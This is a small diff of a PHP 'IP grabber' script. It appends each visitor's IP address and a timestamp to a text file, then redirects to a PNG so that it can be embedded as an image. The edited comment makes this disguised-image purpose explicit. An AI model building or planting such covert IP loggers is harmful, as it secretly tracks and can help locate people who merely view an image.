@@ -7,6 +7,6 @@ $ip = $_SERVER['REMOTE_ADDR']; // gets ip
 $content = "$ip | " . date('Y-m-d H:i:s') . PHP_EOL; // content that will be in the txt
 file_put_contents($filename, $content, FILE_APPEND);
 
-header('Location: gnegrila.png'); // put ur own png ( in the same directory as the php file )
+header('Location: gnegrila.png'); // after grabbing ips will redirect u to the png so the "img src=" would work
 exit();
 ?>
